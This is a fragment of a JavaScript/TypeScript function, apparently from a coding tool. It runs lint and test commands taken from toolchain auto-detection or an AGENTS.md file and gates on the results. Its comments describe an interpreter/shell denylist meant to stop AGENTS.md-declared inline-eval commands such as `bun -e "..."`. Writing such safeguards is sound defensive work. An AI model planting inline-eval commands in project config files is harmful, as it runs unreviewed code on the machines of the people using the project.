  // Commands from toolchain auto-detection (detectToolchainCommands) are
  // hardcoded by this codebase — e.g. "bun test" — and are marked `trusted`
  // so a legitimate internal use of `bun` isn't blocked by the same denylist
  // entry that exists to stop an AGENTS.md-declared literal `bun -e "..."`.
  const trusted = source !== "agents_md";

  // Phase 0-A — Lint: run exhaustively regardless of individual failures.
  const lintResults = lintCommands.map(({ label, command }) => {
    const { status, output } = executeCheckCommand(projectRoot, command, { ...options, trusted });
    return { label, command, status, output };
  });

  // TIMEOUT and REJECTED are treated as blocking alongside FAILED: a check
  // that couldn't complete in time, or that was refused outright by the
  // interpreter/shell denylist, is not a passing check — it must never be
  // silently treated as if the check succeeded. Each is reported with a
  // distinct status so the caller can say "timed out" vs "failed" vs
  // "rejected as unsafe".
  const lintFailed = lintResults.some(
    (r) => r.status === "FAILED" || r.status === "TIMEOUT" || r.status === "REJECTED"
  );

  if (lintFailed) {
    const testResults = testCommands.map(({ label, command }) => ({
      label,
      command,
      status: "NOT_RUN",
      output: "lint phase failed",
      onFailure: "block",
      blocking: false,
    }));
    return { discovered: true, source, lint: lintResults, test: testResults, verdict: "FAIL", gate: "lint" };
  }

  // Phase 0-B — Tests: run exhaustively; a failure blocks unless on-failure: warn.
  // Note: REJECTED always blocks regardless of `on-failure: warn` — a denylisted
  // command was never executed at all, so there's nothing for "warn" to
  // downgrade; it's a config problem in AGENTS.md, not a tolerable test failure.
  const testResults = testCommands.map(({ label, command, onFailure = "block" }) => {
    const { status, output } = executeCheckCommand(projectRoot, command, { ...options, trusted });
    const blocking =
      status === "REJECTED" || ((status === "FAILED" || status === "TIMEOUT") && onFailure !== "warn");
    return { label, command, status, output, onFailure, blocking };
  });

  const testGateFailed = testResults.some((r) => r.blocking);

  return {
    discovered: true,
    source,
    lint: lintResults,
    test: testResults,
    verdict: testGateFailed ? "FAIL" : "PASS",
    gate: testGateFailed ? "test" : null,
  };
}
